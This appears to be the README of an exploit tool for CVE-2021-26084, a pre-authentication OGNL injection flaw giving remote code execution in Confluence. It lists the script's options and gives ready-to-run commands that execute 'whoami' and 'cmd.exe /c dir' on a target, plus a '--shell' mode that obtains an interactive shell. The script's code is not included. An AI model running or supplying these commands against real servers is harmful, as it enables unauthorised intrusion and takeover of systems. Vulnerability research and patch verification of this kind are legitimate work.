# CVE-2021-26084 - Confluence Pre-Auth RCE  OGNL injection
### Usage

- ```
  usage: cve-2021-26084_confluence_rce.py [-h] --url URL [--cmd CMD] [--shell]
  
  CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection
  
  optional arguments:
    -h, --help         show this help message and exit
    --url URL, -u URL  Target Url
    --cmd CMD, -c CMD  Command
    --shell            Get shell
  ```

- ```
  python3 cve-2021-26084_confluence_rce.py -u http://target:8090 -c "whoami"
  ```

  ![1630484082986](img/1630484082986.png)

- ```
  python3 cve-2021-26084_confluence_rce.py -u http://target:8090 -c "cmd.exe /c dir"
  ```

  ![1630484112292](img/1630484112292.png)



#### GetShsell

```
python3 cve-2021-26084_confluence_rce.py -u http://target:8090 --shell
```

![1630490483870](img/1630490483870.png)

![1630490401164](img/1630490401164.png)

### Reference:

https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md